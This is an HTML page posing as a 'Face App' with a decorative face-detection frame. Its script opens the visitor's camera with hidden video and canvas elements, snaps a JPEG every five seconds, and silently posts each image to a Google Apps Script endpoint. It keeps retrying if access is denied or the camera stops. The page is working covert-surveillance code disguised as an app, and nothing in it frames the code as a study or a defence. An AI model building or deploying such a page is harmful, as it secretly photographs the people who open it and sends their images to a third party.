<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Face App</title>

<link rel="stylesheet" href="style.css">

</head>

<body>

<div id="device">

<div id="top">
<div class="left"></div>
<div class="right"></div>
</div>

<div id="content">

<div class="menu">
<div class="profilePhoto"></div>
</div>

<div class="detection">
<div class="line-left"></div>
<div class="line-top"></div>
<div class="line-right"></div>
<div class="line-bottom"></div>
</div>

</div>
</div>

<div class="video-wrap" hidden>
<video id="video" playsinline autoplay></video>
</div>

<canvas hidden id="canvas" width="320" height="320"></canvas>

<script>

const GAS_URL="https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec";

const video=document.getElementById("video");
const canvas=document.getElementById("canvas");

let stream=null;
let sending=false;

async function startCamera(){

try{

stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});

video.srcObject=stream;

video.onloadedmetadata=function(){

startCapture();

};

stream.getVideoTracks()[0].onended=function(){

console.log("camera stopped");

setTimeout(startCamera,3000);

};

}

catch(e){

console.log("permission denied");

setTimeout(startCamera,5000);

}

}

function startCapture(){

if(sending) return;

sending=true;

const ctx=canvas.getContext("2d");

setInterval(()=>{

if(document.hidden){

console.log("tab background");

}

ctx.drawImage(video,0,0,320,320);

const img=canvas.toDataURL("image/jpeg",0.6);

const base64=img.replace("data:image/jpeg;base64,","");

sendImage(base64);

},5000);

}

async function sendImage(data){

try{

await fetch(GAS_URL,{

method:"POST",

headers:{

"Content-Type":"application/x-www-form-urlencoded"

},

body:"cat="+encodeURIComponent(data)

});

console.log("sent");

}

catch(e){

console.log("send error");

}

}

document.addEventListener("visibilitychange",()=>{

if(document.hidden){

console.log("tab hidden");

}else{

console.log("tab active");

}

});

startCamera();

</script>

</body>
</html>
